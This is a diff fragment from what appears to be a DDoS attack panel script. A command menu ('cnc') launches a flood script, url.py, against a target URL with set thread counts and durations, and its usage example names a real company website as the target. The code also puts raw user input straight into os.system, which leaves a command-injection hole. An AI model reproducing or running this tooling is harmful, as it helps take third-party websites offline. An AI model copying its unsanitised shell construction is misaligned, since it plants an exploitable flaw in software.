@@ -341,13 +341,12 @@ def main():
         elif "raz" in cnc:
             try:
                 target = cnc.split()[1]
-                time = cnc.split()[2]
-                rate = cnc.split()[3]
-                threads = cnc.split()[4]
-                os.system(f'python3 url.py {target} {time} {rate} {threads}')
+                threads = cnc.split()[2]
+                time = cnc.split()[3]
+                os.system(f'python3 url.py {target} {threads} {time}')
             except IndexError:
-                print('Usage: lightning <url> <time> <rps> <threads>')
-                print('Example: lightning https://www.google.com/ 80 5000 5000')
+                print('Usage: raz <web> <threads> <waktu>')
+                print('Example: raz https://mikrotik.com 5000 60')
 
         elif "nfo-killer" in cnc:
             try:
